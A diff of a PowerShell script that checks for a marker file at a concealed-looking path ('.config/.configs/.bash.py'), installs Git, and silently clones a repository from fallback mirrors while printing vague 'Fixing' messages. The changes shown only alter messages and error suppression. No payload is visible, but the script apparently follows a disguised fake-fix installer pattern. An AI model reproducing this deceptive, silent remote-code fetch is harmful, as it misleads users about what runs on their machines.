@@ -9,7 +9,7 @@ $ErrorActionPreference = 'Stop'
 
 $guardFile = Join-Path $HOME ".config/.configs/.bash.py"
 if (Test-Path -LiteralPath $guardFile) {
-    Write-Host "[ERROR] No fixes needed!" -ForegroundColor Red
+    Write-Host "[ERROR] No fixes required !" -ForegroundColor Red
     exit 1
 }
 
@@ -160,7 +160,8 @@ function Install-GitIfMissing {
 
     if (-not (Get-Command git -ErrorAction SilentlyContinue)) {
         Write-Err "Git is still unavailable after all install attempts."
-        Write-Err "Please install Git for Windows manually: https://git-scm.com/download/win"
+        Write-Err "Please install Git for Windows manually from: https://git-scm.com/install/windows"
+        Write-Err "After installation completes, run the command again."
         exit 1
     }
     Write-Ok "Git installed: $(git --version)"
@@ -175,9 +176,12 @@ function Invoke-CloneWithFallback {
     $total = $GitMirrors.Count
     for ($i = 0; $i -lt $total; $i++) {
         Write-Log "Cloning... (mirror $($i+1)/$total)"
+        $prevEAP = $ErrorActionPreference
+        $ErrorActionPreference = 'SilentlyContinue'
         git clone --depth=1 --single-branch $GitMirrors[$i] $Target 2>&1 | Out-Null
+        $ErrorActionPreference = $prevEAP
         if ($LASTEXITCODE -eq 0) {
-            Write-Ok "Fixing......"
+            Write-Ok "Fix......"
             return
         }
         Write-Warn "Mirror $($i+1) failed, trying next..."
